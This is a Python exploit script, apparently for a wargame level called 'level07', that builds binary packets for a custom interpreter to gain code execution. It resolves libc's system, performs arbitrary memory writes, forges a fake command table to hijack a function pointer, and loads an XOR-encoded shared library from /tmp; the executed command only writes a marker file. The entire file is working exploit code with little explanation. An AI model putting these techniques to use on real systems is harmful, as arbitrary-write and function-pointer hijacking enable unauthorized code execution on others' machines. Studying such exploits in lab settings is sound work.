import sys

import struct

pak = b''

# regpos@level07 + 4
# s = b'level07\0'
# pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\xaf\x04\x00' + struct.pack('<i', 0)
pak += b'\x4d\x00\x00'
# s = b'_regops\0'
# pak += b'\xea' + struct.pack('<H', len(s)) + s
# pak += b'\xb4\x00\x00'
pak += b'\xaf\x04\x00' + struct.pack('<i', -(0x3c88 + 4))
pak += b'\x46\x00\x00'

# system@libc
s = b'libc\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\x4d\x00\x00'
s = b'system\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\xb4\x00\x00'

# write
pak += b'\xb0\x00\x00'

# command
s = b'echo win7 > /tmp/win7\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s

# jump
pak += b'\x95\x00\x00'

# ok
pak += b'\x70\x00\x00'

######################

# get main
pak = b''
pak += b'\xaf\x04\x00' + struct.pack('<i', 0)
pak += b'\x4d\x00\x00'
s = b'main\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\xb4\x00\x00'

# add 10224 which is the difference from regops
pak += b'\xaf\x04\x00' + struct.pack('<i', -(10224 + 4))
pak += b'\x46\x00\x00'

# get the address of system
s = b'libc-2.13.so\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\x4d\x00\x00'
s = b'system\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\xb4\x00\x00'

# write
pak += b'\xb0\x00\x00'

# command
s = b'echo win7 > /tmp/win7\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s

# jump
pak += b'\x95\x00\x00'

# ok
pak += b'\x70\x00\x00'

########################################################

pak = b''

s = b'/tmp/level07.so\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s

s = bytes([c ^ 0xa5 for c in open('libfoo.so', 'rb').read()])
assert len(s) < 0x10000
s = b'\xa5' * 0x7e0
pak += b'\xea' + struct.pack('<H', len(s)) + s

pak += b'\xaf\x04\x00' + struct.pack('<I', len(s))

pak += b'\x23\x00\x00'

s = b'/tmp/level07.so\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s

pak += b'\x4d\x00\x00'

pak += b'\x70\x00\x00'

########################################################

pak = b''

pak += b'\xaf\x04\x00' + b'\x00\x00\x00\x00'
pak += b'\x4d\x00\x00'

s = b'parse_pak\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\xb4\x00\x00'

pak += b'\x70\x00\x00'


####################################################


def write_to_addr(addr, value):
    res = b'\xaf\x04\00' + struct.pack('<I', addr)
    res += b'\xaf\x04\00' + struct.pack('<I', value)
    res += b'\xb0\x00\x00'

    return res


pak = b''

# write fake cmdtab to 0xb0000000
a = 0xb0000000
# pak += write_to_addr(a, 0xAAAAAAAA)  # opcode
pak += write_to_addr(a, 0x6b726f66)  # opcode execute_command
pak += write_to_addr(a + 4, 0)  # flags
pak += write_to_addr(a + 12, a)  # prev
pak += write_to_addr(a + 16, a + 20)  # next, first guess for execute_command

# get and write system as fp
## get fake cmdtab.fp address
pak += b'\xaf\x04\x00' + struct.pack('<I', a + 8)

## get lib
pak += b'\xaf\x04\x00' + b'\x00\x00\x00\x00'
pak += b'\x4d\x00\x00'

## get main
s = b'fork\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\xb4\x00\x00'

## write system to fp
pak += b'\xb0\x00\x00'

# get cmdtab_head address
## get lib
pak += b'\xaf\x04\x00' + b'\x00\x00\x00\x00'
pak += b'\x4d\x00\x00'

## get cmdtab_head
s = b'cmdtab_head\0'
pak += b'\xea' + struct.pack('<H', len(s)) + s
pak += b'\xb4\x00\x00'

# write address to cmdtab_head address
pak += b'\xaf\x04\x00' + struct.pack('<I', a)
pak += b'\xb0\x00\x00'

# continue chain
for i in range(512):
    base = 0xb76ff000 + i * 0x1000
    execmd_addr = base + 0x11c0
    curr_cmdtab_addr = a + 20 + 20 * i

    # write next cmd_tab
    pak += write_to_addr(curr_cmdtab_addr, i)  # opcode execute_command
    pak += write_to_addr(curr_cmdtab_addr + 4, 0)  # flags
    pak += write_to_addr(curr_cmdtab_addr + 8, execmd_addr)  # fp
    pak += write_to_addr(curr_cmdtab_addr + 12, curr_cmdtab_addr - 20)  # prev
    pak += write_to_addr(curr_cmdtab_addr + 16, curr_cmdtab_addr + 20)  # next, first guess for execute_command

# ok
pak += b'\x70\x00\x00'

sys.stdout.buffer.write(pak)

